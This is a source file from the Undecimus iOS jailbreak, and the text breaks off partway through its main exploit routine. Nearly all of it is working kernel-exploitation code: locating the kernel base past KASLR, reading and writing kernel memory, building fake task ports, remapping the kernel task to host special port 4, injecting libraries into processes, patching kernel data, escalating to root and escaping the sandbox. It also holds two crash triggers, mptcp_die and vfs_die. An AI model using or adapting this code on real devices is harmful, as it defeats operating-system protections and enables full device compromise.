//
//  ViewController.m
//  Undecimus
//
//  Created by pwn20wnd on 8/29/18.
//  Copyright © 2018 Pwn20wnd. All rights reserved.
//

#include <sys/snapshot.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <copyfile.h>
#include <spawn.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <libgen.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dirent.h>
#include <sys/sysctl.h>
#import "ViewController.h"
#include "common.h"
#include "offsets.h"
#include "empty_list_sploit.h"
#include "kmem.h"
#include "patchfinder64.h"
#include "kexecute.h"
#include "kutils.h"
extern int (*dsystem)(const char *);
#include "libjb.h"
#include "remote_memory.h"
#include "remote_call.h"
#include "QiLin.h"
#include "iokit.h"
#include "unlocknvram.h"
#include "SettingsTableViewController.h"
#include "untar.h"
#include "multi_path_sploit.h"

@interface ViewController ()

@end

@implementation ViewController

#define __FILENAME__ (__builtin_strrchr(__FILE__, '/') ? __builtin_strrchr(__FILE__, '/') + 1 : __FILE__)

#define _assert(test) do \
    if (!(test)) { \
        fprintf(stderr, "__assert(%d:%s)@%s:%u[%s]\n", errno, #test, __FILENAME__, __LINE__, __FUNCTION__); \
        dispatch_semaphore_t semaphore; \
        semaphore = dispatch_semaphore_create(0); \
        dispatch_async(dispatch_get_main_queue(), ^{ \
            UIAlertController *alertController = [UIAlertController alertControllerWithTitle:@"Error" message:[NSString stringWithFormat:@"__assert(%d:%s)@%s:%u[%s]\n", errno, #test, __FILENAME__, __LINE__, __FUNCTION__] preferredStyle:UIAlertControllerStyleAlert]; \
            UIAlertAction *OK = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) { \
                dispatch_semaphore_signal(semaphore); \
            }]; \
            [alertController addAction:OK]; \
            [alertController setPreferredAction:OK]; \
            [[[[[UIApplication sharedApplication] delegate] window] rootViewController] presentViewController:alertController animated:YES completion:nil]; \
        }); \
        dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER); \
        exit(1); \
    } \
while (false)

// https://github.com/JonathanSeals/kernelversionhacker/blob/3dcbf59f316047a34737f393ff946175164bf03f/kernelversionhacker.c#L92

#define IMAGE_OFFSET 0x2000
#define MACHO_HEADER_MAGIC 0xfeedfacf
#define MAX_KASLR_SLIDE 0x21000000
#define KERNEL_SEARCH_ADDRESS 0xfffffff007004000

#define ptrSize sizeof(uintptr_t)

static vm_address_t get_kernel_base(mach_port_t tfp0)
{
    uint64_t addr = 0;
    addr = KERNEL_SEARCH_ADDRESS+MAX_KASLR_SLIDE;
    
    while (1) {
        char *buf;
        mach_msg_type_number_t sz = 0;
        kern_return_t ret = vm_read(tfp0, addr, 0x200, (vm_offset_t*)&buf, &sz);
        
        if (ret) {
            goto next;
        }
        
        if (*((uint32_t *)buf) == MACHO_HEADER_MAGIC) {
            int ret = vm_read(tfp0, addr, 0x1000, (vm_offset_t*)&buf, &sz);
            if (ret != KERN_SUCCESS) {
                printf("Failed vm_read %i\n", ret);
                goto next;
            }
            
            for (uintptr_t i=addr; i < (addr+0x2000); i+=(ptrSize)) {
                mach_msg_type_number_t sz;
                int ret = vm_read(tfp0, i, 0x120, (vm_offset_t*)&buf, &sz);
                
                if (ret != KERN_SUCCESS) {
                    printf("Failed vm_read %i\n", ret);
                    exit(-1);
                }
                if (!strcmp(buf, "__text") && !strcmp(buf+0x10, "__PRELINK_TEXT")) {
                    return addr;
                }
            }
        }
        
    next:
        addr -= 0x200000;
    }
}

int sha1_to_str(const unsigned char *hash, int hashlen, char *buf, size_t buflen)
{
    if (buflen < (hashlen*2+1)) {
        return -1;
    }
    
    int i;
    for (i=0; i<hashlen; i++) {
        sprintf(buf+i*2, "%02X", hash[i]);
    }
    buf[i*2] = 0;
    return ERR_SUCCESS;
}

char *copyBootHash(void)
{
    io_registry_entry_t chosen = IORegistryEntryFromPath(kIOMasterPortDefault, "IODeviceTree:/chosen");
    
    if (!MACH_PORT_VALID(chosen)) {
        printf("Unable to get IODeviceTree:/chosen port\n");
        return NULL;
    }
    
    CFDataRef hash = (CFDataRef)IORegistryEntryCreateCFProperty(chosen, CFSTR("boot-manifest-hash"), kCFAllocatorDefault, 0);
    
    IOObjectRelease(chosen);
    
    if (hash == nil) {
        fprintf(stderr, "Unable to read boot-manifest-hash\n");
        return NULL;
    }
    
    if (CFGetTypeID(hash) != CFDataGetTypeID()) {
        fprintf(stderr, "Error hash is not data type\n");
        CFRelease(hash);
        return NULL;
    }
    
    // Make a hex string out of the hash
    
    CFIndex length = CFDataGetLength(hash) * 2 + 1;
    char *manifestHash = (char*)calloc(length, sizeof(char));
    
    int ret = sha1_to_str(CFDataGetBytePtr(hash), (int)CFDataGetLength(hash), manifestHash, length);
    
    CFRelease(hash);
    
    if (ret != ERR_SUCCESS) {
        printf("Unable to generate bootHash string\n");
        free(manifestHash);
        return NULL;
    }
    
    return manifestHash;
}

#define APPLESNAP "com.apple.os.update-"

const char *systemSnapshot(char *bootHash)
{
    if (!bootHash) {
        return NULL;
    }
    
    return [[NSString stringWithFormat:@APPLESNAP @"%s", bootHash] UTF8String];
}

uint64_t
find_gadget_candidate(
                      char** alternatives,
                      size_t gadget_length)
{
    void* haystack_start = (void*)atoi;    // will do...
    size_t haystack_size = 100*1024*1024; // likewise...
    
    for (char* candidate = *alternatives; candidate != NULL; alternatives++) {
        void* found_at = memmem(haystack_start, haystack_size, candidate, gadget_length);
        if (found_at != NULL){
            printf("found at: %llx\n", (uint64_t)found_at);
            return (uint64_t)found_at;
        }
    }
    
    return 0;
}

uint64_t blr_x19_addr = 0;
uint64_t
find_blr_x19_gadget()
{
    if (blr_x19_addr != 0){
        return blr_x19_addr;
    }
    char* blr_x19 = "\x60\x02\x3f\xd6";
    char* candidates[] = {blr_x19, NULL};
    blr_x19_addr = find_gadget_candidate(candidates, 4);
    return blr_x19_addr;
}

int inject_library(pid_t pid, const char *path)
{
    mach_port_t task_port = MACH_PORT_NULL;
    kern_return_t ret = KERN_FAILURE;
    ret = task_for_pid(mach_task_self(), pid, &task_port);
    if (!MACH_PORT_VALID(task_port) || ret != KERN_SUCCESS) {
        return -1;
    }
    call_remote(task_port, dlopen, 2, REMOTE_CSTRING(path), REMOTE_LITERAL(RTLD_NOW));
    uint64_t error = call_remote(task_port, dlerror, 0);
    if (error != 0) {
        return -1;
    }
    return 0;
}

size_t
kread(uint64_t where, void *p, size_t size)
{
    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(tfp0, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
        if (rv || sz == 0) {
            fprintf(stderr, "[e] error reading kernel @%p\n", (void *)(offset + where));
            break;
        }
        offset += sz;
    }
    return offset;
}

size_t
kwrite(uint64_t where, const void *p, size_t size)
{
    int rv;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_write(tfp0, where + offset, (mach_vm_offset_t)p + offset, (mach_msg_type_number_t)chunk);
        if (rv) {
            fprintf(stderr, "[e] error writing kernel @%p\n", (void *)(offset + where));
            break;
        }
        offset += chunk;
    }
    return offset;
}

// thx Siguza
typedef struct {
    uint64_t prev;
    uint64_t next;
    uint64_t start;
    uint64_t end;
} kmap_hdr_t;

uint64_t zm_fix_addr(uint64_t addr, uint64_t zone_map_ref) {
    static kmap_hdr_t zm_hdr = {0, 0, 0, 0};
    if (zm_hdr.start == 0) {
        // xxx rk64(0) ?!
        // uint64_t zone_map_ref = find_zone_map_ref();
        fprintf(stderr, "zone_map_ref: %llx \n", zone_map_ref);
        uint64_t zone_map = rk64(zone_map_ref);
        fprintf(stderr, "zone_map: %llx \n", zone_map);
        // hdr is at offset 0x10, mutexes at start
        size_t r = kread(zone_map + 0x10, &zm_hdr, sizeof(zm_hdr));
        fprintf(stderr, "zm_range: 0x%llx - 0x%llx (read 0x%zx, exp 0x%zx)\n", zm_hdr.start, zm_hdr.end, r, sizeof(zm_hdr));
        
        if (r != sizeof(zm_hdr) || zm_hdr.start == 0 || zm_hdr.end == 0) {
            fprintf(stderr, "kread of zone_map failed!\n");
            exit(1);
        }
        
        if (zm_hdr.end - zm_hdr.start > 0x100000000) {
            fprintf(stderr, "zone_map is too big, sorry.\n");
            exit(1);
        }
    }
    
    uint64_t zm_tmp = (zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff);
    
    return zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp;
}

uint32_t IO_BITS_ACTIVE = 0x80000000;
uint32_t IKOT_TASK = 2;
uint32_t IKOT_NONE = 0;

void convert_port_to_task_port(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
    // now make the changes to the port object to make it a task port:
    uint64_t port_kaddr = getAddressOfPort(getpid(), port);
    
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
    wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
    wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr);
    
    // swap our receive right for a send right:
    uint64_t task_port_addr = task_self_addr();
    uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint32_t bits = rk32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
    
#define IE_BITS_SEND (1<<16)
#define IE_BITS_RECEIVE (1<<17)
    
    bits &= (~IE_BITS_RECEIVE);
    bits |= IE_BITS_SEND;
    
    wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
}

void make_port_fake_task_port(mach_port_t port, uint64_t task_kaddr) {
    convert_port_to_task_port(port, ipc_space_kernel(), task_kaddr);
}

uint64_t make_fake_task(uint64_t vm_map) {
    uint64_t fake_task_kaddr = kmem_alloc(0x1000);
    
    void* fake_task = malloc(0x1000);
    memset(fake_task, 0, 0x1000);
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
    *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
    kmemcpy(fake_task_kaddr, (uint64_t) fake_task, 0x1000);
    free(fake_task);
    
    return fake_task_kaddr;
}

// Stek29's code.

kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
int remap_tfp0_set_hsp4(mach_port_t *port, uint64_t zone_map_ref) {
    // huge thanks to Siguza for hsp4 & v0rtex
    // for explainations and being a good rubber duck :p
    
    // see https://github.com/siguza/hsp4 for some background and explaination
    // tl;dr: there's a pointer comparison in convert_port_to_task_with_exec_token
    //   which makes it return TASK_NULL when kernel_task is passed
    //   "simple" vm_remap is enough to overcome this.
    
    // However, vm_remap has weird issues with submaps -- it either doesn't remap
    // or using remapped addresses leads to panics and kittens crying.
    
    // tasks fall into zalloc, so src_map is going to be zone_map
    // zone_map works perfectly fine as out zone -- you can
    // do remap with src/dst being same and get new address
    
    // however, using kernel_map makes more sense
    // we don't want zalloc to mess with our fake task
    // and neither
    
    // proper way to use vm_* APIs from userland is via mach_vm_*
    // but those accept task ports, so we're gonna set up
    // fake task, which has zone_map as its vm_map
    // then we'll build fake task port from that
    // and finally pass that port both as src and dst
    
    // last step -- wire new kernel task -- always a good idea to wire critical
    // kernel structures like tasks (or vtables :P )
    
    // and we can write our port to realhost.special[4]
    
    // we can use mach_host_self() if we're root
    mach_port_t host_priv = fake_host_priv();
    
    int ret;
    uint64_t remapped_task_addr = 0;
    // task is smaller than this but it works so meh
    uint64_t sizeof_task = 0x1000;
    
    uint64_t kernel_task_kaddr;
    
    {
        // find kernel task first
        kernel_task_kaddr = rk64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
        
        while (kernel_task_kaddr != 0) {
            uint64_t bsd_info = rk64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
            
            uint32_t pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
            
            if (pid == 0) {
                break;
            }
            
            kernel_task_kaddr = rk64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_PREV));
        }
        
        if (kernel_task_kaddr == 0) {
            printf("[remap_kernel_task] failed to find kernel task\n");
            return 1;
        }
        
        printf("[remap_kernel_task] kernel task at 0x%llx\n", kernel_task_kaddr);
    }
    
    mach_port_t zm_fake_task_port = MACH_PORT_NULL;
    mach_port_t km_fake_task_port = MACH_PORT_NULL;
    ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &zm_fake_task_port);
    ret = ret || mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &km_fake_task_port);
    
    if (ret == KERN_SUCCESS && *port == MACH_PORT_NULL) {
        ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port);
    }
    
    if (ret != KERN_SUCCESS) {
        printf("[remap_kernel_task] unable to allocate ports: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }
    
    // strref \"Nothing being freed to the zone_map. start = end = %p\\n\"
    // or traditional \"zone_init: kmem_suballoc failed\"
    uint64_t zone_map_kptr = zone_map_ref;
    uint64_t zone_map = rk64(zone_map_kptr);
    
    // kernel_task->vm_map == kernel_map
    uint64_t kernel_map = rk64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
    
    uint64_t zm_fake_task_kptr = make_fake_task(zone_map);
    uint64_t km_fake_task_kptr = make_fake_task(kernel_map);
    
    make_port_fake_task_port(zm_fake_task_port, zm_fake_task_kptr);
    make_port_fake_task_port(km_fake_task_port, km_fake_task_kptr);
    
    km_fake_task_port = zm_fake_task_port;
    
    vm_prot_t cur, max;
    ret = mach_vm_remap(km_fake_task_port,
                        &remapped_task_addr,
                        sizeof_task,
                        0,
                        VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR,
                        zm_fake_task_port,
                        kernel_task_kaddr,
                        0,
                        &cur, &max,
                        VM_INHERIT_NONE);
    
    
    if (ret != KERN_SUCCESS) {
        printf("[remap_kernel_task] remap failed: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }
    
    if (kernel_task_kaddr == remapped_task_addr) {
        printf("[remap_kernel_task] remap failure: addr is the same after remap\n");
        return 1;
    }
    
    printf("[remap_kernel_task] remapped successfully to 0x%llx\n", remapped_task_addr);
    
    ret = mach_vm_wire(host_priv, km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE);
    
    if (ret != KERN_SUCCESS) {
        printf("[remap_kernel_task] wire failed: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }
    
    uint64_t port_kaddr = getAddressOfPort(getpid(), *port);
    printf("[remap_kernel_task] port kaddr: 0x%llx\n", port_kaddr);
    
    make_port_fake_task_port(*port, remapped_task_addr);
    
    if (rk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) != remapped_task_addr) {
        printf("[remap_kernel_task] read back tfpzero kobject didnt match!\n");
        return 1;
    }
    
    // lck_mtx -- arm: 8  arm64: 16
    const int offsetof_host_special = 0x10;
    uint64_t host_priv_kaddr = getAddressOfPort(getpid(), mach_host_self());
    uint64_t realhost_kaddr = rk64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    wk64(realhost_kaddr + offsetof_host_special + 4 * sizeof(void*), port_kaddr);
    
    return 0;
}

// https://stackoverflow.com/a/47195924
char *readFile(char *filename) {
    FILE *f = fopen(filename, "rt");
    _assert(f);
    fseek(f, 0, SEEK_END);
    long length = ftell(f);
    fseek(f, 0, SEEK_SET);
    char *buffer = (char *) malloc(length + 1);
    buffer[length] = '\0';
    fread(buffer, 1, length, f);
    fclose(f);
    return buffer;
}

void blockDomainWithName(char *name) {
    char *hostsFile = readFile("/etc/hosts");
    _assert(hostsFile);
    char *newLine = malloc(sizeof(char *) + (11 + sizeof(name)));
    bzero(newLine, sizeof(char *) + (11 + sizeof(name)));
    sprintf(newLine, "127.0.0.1 %s", name);
    if (strstr(hostsFile, newLine)) return;
    FILE *f = fopen("/etc/hosts", "a");
    _assert(f);
    fprintf(f, "%s\n", newLine);
    fclose(f);
}

// https://github.com/JonathanSeals/kernelversionhacker/blob/3dcbf59f316047a34737f393ff946175164bf03f/kernelversionhacker.c#L92

#define DEFAULT_VERSION_STRING "hacked"
int updateVersionString(char *newVersionString, mach_port_t tfp0, vm_address_t kernel_base) {
    uintptr_t versionPtr = 0;
    struct utsname u = {0};
    uname(&u);
    
    uintptr_t darwinTextPtr = 0;
    
    char *buf = NULL;
    
    vm_size_t sz;
    uintptr_t TEXT_const = 0;
    uint32_t sizeofTEXT_const = 0;
    uintptr_t DATA_data = 0;
    uint32_t sizeofDATA_data = 0;
    
    char *sectName = "__const";
    
    for (uintptr_t i=kernel_base; i < (kernel_base+0x2000); i+=(ptrSize)) {
        int ret = vm_read(tfp0, i, 0x150, (vm_offset_t*)&buf, (mach_msg_type_number_t*)&sz);
        if (ret != KERN_SUCCESS) {
            printf("Failed vm_read %i\n", ret);
            exit(-1);
        }
        
        if (!strcmp(buf, sectName) && !strcmp(buf+0x10, "__TEXT")) {
            TEXT_const = *(uintptr_t*)(buf+0x20);
            sizeofTEXT_const = (uint32_t)*(uintptr_t*)(buf+(0x20 + ptrSize));
            
        }
        
        else if (!strcmp(buf, "__data") && !strcmp(buf+0x10, "__DATA")) {
            DATA_data = *(uintptr_t*)(buf+0x20);
            sizeofDATA_data = (uint32_t)*(uintptr_t*)(buf+(0x20 + ptrSize));
        }
        
        if (TEXT_const && sizeofTEXT_const && DATA_data && sizeofDATA_data)
            break;
    }
    
    if (!(TEXT_const && sizeofTEXT_const && DATA_data && sizeofDATA_data)) {
        printf("Error parsing kernel macho\n");
        return -1;
    }
    
    for (uintptr_t i = TEXT_const; i < (TEXT_const+sizeofTEXT_const); i += 2)
    {
        int ret = vm_read_overwrite(tfp0, i, strlen("Darwin Kernel Version"), (vm_address_t)buf, &sz);
        if (ret != KERN_SUCCESS) {
            printf("Failed vm_read %i\n", ret);
            return -1;
        }
        if (!memcmp(buf, "Darwin Kernel Version", strlen("Darwin Kernel Version"))) {
            darwinTextPtr = i;
            break;
        }
    }
    
    if (!darwinTextPtr) {
        printf("Error finding Darwin text\n");
        return -1;
    }
    
    uintptr_t versionTextXref[ptrSize];
    versionTextXref[0] = darwinTextPtr;
    
    for (uintptr_t i = DATA_data; i < (DATA_data+sizeofDATA_data); i += ptrSize) {
        int ret = vm_read_overwrite(tfp0, i, ptrSize, (vm_address_t)buf, &sz);
        if (ret != KERN_SUCCESS) {
            printf("Failed vm_read %i\n", ret);
            return -1;
        }
        
        if (!memcmp(buf, versionTextXref, ptrSize)) {
            versionPtr = i;
            break;
        }
    }
    
    if (!versionPtr) {
        printf("Error finding _version pointer, did you already patch it?\n");
        return -1;
    }
    
    kern_return_t ret;
    vm_address_t newStringPtr = 0;
    vm_allocate(tfp0, &newStringPtr, strlen(newVersionString), VM_FLAGS_ANYWHERE);
    
    ret = vm_write(tfp0, newStringPtr, (vm_offset_t)newVersionString, (mach_msg_type_number_t)strlen(newVersionString));
    if (ret != KERN_SUCCESS) {
        printf("Failed vm_write %i\n", ret);
        exit(-1);
    }
    
    ret = vm_write(tfp0, versionPtr, (vm_offset_t)&newStringPtr, ptrSize);
    if (ret != KERN_SUCCESS) {
        printf("Failed vm_write %i\n", ret);
        return -1;
    }
    else {
        memset(&u, 0x0, sizeof(u));
        uname(&u);
        return 0;
    }
}

// https://stackoverflow.com/a/779960
// You must free the result if result is non-NULL.
char *str_replace(char *orig, char *rep, char *with) {
    char *result; // the return string
    char *ins;    // the next insert point
    char *tmp;    // varies
    int len_rep;  // length of rep (the string to remove)
    int len_with; // length of with (the string to replace rep with)
    int len_front; // distance between rep and end of last rep
    int count;    // number of replacements
    
    // sanity checks and initialization
    if (!orig || !rep)
        return NULL;
    len_rep = (int)strlen(rep);
    if (len_rep == 0)
        return NULL; // empty rep causes infinite loop during count
    if (!with)
        with = "";
    len_with = (int)strlen(with);
    
    // count the number of replacements needed
    ins = orig;
    for (count = 0; (tmp = strstr(ins, rep)); ++count) {
        ins = tmp + len_rep;
    }
    
    tmp = result = malloc(strlen(orig) + (len_with - len_rep) * count + 1);
    
    if (!result)
        return NULL;
    
    // first time through the loop, all the variable are set correctly
    // from here on,
    //    tmp points to the end of the result string
    //    ins points to the next occurrence of rep in orig
    //    orig points to the remainder of orig after "end of rep"
    while (count--) {
        ins = strstr(orig, rep);
        len_front = (int)(ins - orig);
        tmp = strncpy(tmp, orig, len_front) + len_front;
        tmp = strcpy(tmp, with) + len_with;
        orig += len_front + len_rep; // move to next "end of rep"
    }
    strcpy(tmp, orig);
    return result;
}

uint64_t _vfs_context(uint64_t vfs_context_current, uint64_t zone_map_ref) {
    // vfs_context_t vfs_context_current(void)
    uint64_t vfs_context = kexecute(vfs_context_current, 1, 0, 0, 0, 0, 0, 0);
    vfs_context = zm_fix_addr(vfs_context, zone_map_ref);
    return vfs_context;
}

int _vnode_lookup(const char *path, int flags, uint64_t *vpp, uint64_t vfs_context, uint64_t vnode_lookup){
    size_t len = strlen(path) + 1;
    uint64_t vnode = kmem_alloc(sizeof(uint64_t));
    uint64_t ks = kmem_alloc(len);
    kwrite(ks, path, len);
    int ret = (int)kexecute(vnode_lookup, ks, 0, vnode, vfs_context, 0, 0, 0);
    if (ret != 0) {
        return -1;
    }
    *vpp = rk64(vnode);
    kmem_free(ks, len);
    kmem_free(vnode, sizeof(uint64_t));
    return 0;
}

int _vnode_put(uint64_t vnode, uint64_t vnode_put){
    return (int)kexecute(vnode_put, vnode, 0, 0, 0, 0, 0, 0);
}

uint64_t getVnodeAtPath(uint64_t vfs_context, char *path, uint64_t vnode_lookup){
    uint64_t *vpp = (uint64_t *)malloc(sizeof(uint64_t));
    int ret = _vnode_lookup(path, O_RDONLY, vpp, vfs_context, vnode_lookup);
    if (ret != 0){
        printf("unable to get vnode from path for %s\n", path);
        return -1;
    }
    uint64_t vnode = *vpp;
    free(vpp);
    return vnode;
}

typedef struct val_attrs {
    uint32_t          length;
    attribute_set_t   returned;
    attrreference_t   name_info;
} val_attrs_t;

int snapshot_list(int dirfd)
{
    struct attrlist attr_list = { 0 };
    int total=0;
    
    attr_list.commonattr = ATTR_BULK_REQUIRED;
    
    char *buf = (char*)calloc(2048, sizeof(char));
    int retcount;
    while ((retcount = fs_snapshot_list(dirfd, &attr_list, buf, 2048, 0))>0) {
        total += retcount;
        char *bufref = buf;
        
        for (int i=0; i<retcount; i++) {
            val_attrs_t *entry = (val_attrs_t *)bufref;
            if (entry->returned.commonattr & ATTR_CMN_NAME) {
                printf("%s\n", (char*)(&entry->name_info) + entry->name_info.attr_dataoffset);
            }
            bufref += entry->length;
        }
    }
    free(buf);
    
    if (retcount < 0) {
        perror("fs_snapshot_list");
        return -1;
    }
    
    return total;
}

int message_size_for_kalloc_size(int kalloc_size) {
    return ((3*kalloc_size)/4) - 0x74;
}

int vfs_die() {
    int fd = open("/", O_RDONLY);
    if (fd == -1) {
        perror("unable to open fs root\n");
        return 0;
    }
    
    struct attrlist al = {0};
    
    al.bitmapcount = ATTR_BIT_MAP_COUNT;
    al.volattr = 0xfff;
    al.commonattr = ATTR_CMN_RETURNED_ATTRS;
    
    size_t attrBufSize = 16;
    void* attrBuf = malloc(attrBufSize);
    int options = 0;
    
    int err = fgetattrlist(fd, &al, attrBuf, attrBufSize, options);
    printf("err: %d\n", err);
    return 0;
}

#define AF_MULTIPATH 39

int mptcp_die() {
    int sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);
    if (sock < 0) {
        printf("socket failed\n");
        perror("");
        return 0;
    }
    printf("got socket: %d\n", sock);
    
    struct sockaddr* sockaddr_src = malloc(256);
    memset(sockaddr_src, 'A', 256);
    sockaddr_src->sa_len = 220;
    sockaddr_src->sa_family = 'B';
    
    struct sockaddr* sockaddr_dst = malloc(256);
    memset(sockaddr_dst, 'A', 256);
    sockaddr_dst->sa_len = sizeof(struct sockaddr_in6);
    sockaddr_dst->sa_family = AF_INET6;
    
    sa_endpoints_t eps = {0};
    eps.sae_srcif = 0;
    eps.sae_srcaddr = sockaddr_src;
    eps.sae_srcaddrlen = 220;
    eps.sae_dstaddr = sockaddr_dst;
    eps.sae_dstaddrlen = sizeof(struct sockaddr_in6);
    
    int err = connectx(
                       sock,
                       &eps,
                       SAE_ASSOCID_ANY,
                       0,
                       NULL,
                       0,
                       NULL,
                       NULL);
    
    printf("err: %d\n", err);
    
    close(sock);
    
    return 0;
}

void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_daemons, int dump_apticket, int run_uicache, const char *boot_nonce)
{
    // Initialize variables.
    int rv = 0;
    uint64_t trust_chain = 0;
    uint64_t amficache = 0;
    uint64_t OSBoolean_True = 0;
    uint64_t OSBoolean_False = 0;
    uint64_t osunserializexml = 0;
    uint64_t smalloc = 0;
    uint64_t allproc = 0;
    uint64_t add_x0_x0_0x40_ret = 0;
    uint64_t rootvnode = 0;
    uint64_t zone_map_ref = 0;
    uint64_t vfs_context_current = 0;
    uint64_t vnode_lookup = 0;
    uint64_t vnode_put = 0;
    NSMutableDictionary *md = nil;
    uint64_t vfs_context = 0;
    uint64_t devVnode = 0;
    uint64_t _rootvnode = 0;
    uint64_t rootfs_vnode = 0;
    uint64_t v_mount = 0;
    uint32_t v_flag = 0;
    FILE *a = NULL;
    char *dev_path = NULL;
    
    {
        // Initialize QiLin.
        
        LOG("Initializing QiLin...");
        rv = initQiLin(tfp0, kernel_base);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully initialized QiLin.");
    }
    
    {
        // Initialize patchfinder64.
        
        LOG("Initializing patchfinder64...");
        rv = init_kernel(kernel_base, NULL);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully initialized patchfinder64.");
    }
    
    {
        // Find offsets.
        
        LOG("Finding offsets...");
        
        trust_chain = find_trustcache();
        LOG("trust_chain: " ADDR "\n", trust_chain);
        amficache = find_amficache();
        LOG("amficache: " ADDR "\n", amficache);
        OSBoolean_True = find_OSBoolean_True();
        LOG("OSBoolean_True: " ADDR "\n", OSBoolean_True);
        OSBoolean_False = find_OSBoolean_False();
        LOG("OSBoolean_False: " ADDR "\n", OSBoolean_False);
        osunserializexml = find_osunserializexml();
        LOG("osunserializexml: " ADDR "\n", osunserializexml);
        smalloc = find_smalloc();
        LOG("smalloc: " ADDR "\n", smalloc);
        allproc = find_allproc();
        LOG("allproc: " ADDR "\n", allproc);
        add_x0_x0_0x40_ret = find_add_x0_x0_0x40_ret();
        LOG("add_x0_x0_0x40_ret: " ADDR "\n", add_x0_x0_0x40_ret);
        rootvnode = find_rootvnode();
        LOG("rootvnode: " ADDR "\n", rootvnode);
        zone_map_ref = find_zone_map_ref();
        LOG("zone_map_ref: " ADDR "\n", zone_map_ref);
        vfs_context_current = find_vfs_context_current();
        LOG("vfs_context_current: " ADDR "\n", vfs_context_current);
        vnode_lookup = find_vnode_lookup();
        LOG("vnode_lookup: " ADDR "\n", vnode_lookup);
        vnode_put = find_vnode_put();
        LOG("vnode_put: " ADDR "\n", vnode_put);
        _assert(trust_chain && amficache && OSBoolean_True && OSBoolean_False && osunserializexml && smalloc && allproc && add_x0_x0_0x40_ret && rootvnode && zone_map_ref && vfs_context_current && vnode_lookup && vnode_put);
        
        LOG("Successfully found offsets.");
    }
    
    {
        // Deinitialize patchfinder64.
        
        LOG("Deinitializing patchfinder64...");
        term_kernel();
        LOG("Successfully deinitialized patchfinder64.");
    }
    
    {
        // Rootify myself.
        
        LOG("Rootifying myself...");
        rv = rootifyMe();
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully rootified myself.");
    }
    
    {
        // Escape Sandbox.
        
        LOG("Escaping Sandbox...");
        ShaiHuludMe(0);
        LOG("Successfully escaped Sandbox.");
    }
    
    {
        // Write a test file to UserFS.
        
        LOG("Writing a test file to UserFS...");
        if (!access("/var/mobile/test.txt", F_OK)) {
            rv = unlink("/var/mobile/test.txt");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        rv = fclose(fopen("/var/mobile/test.txt", "w"));
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/var/mobile/test.txt", 0755);
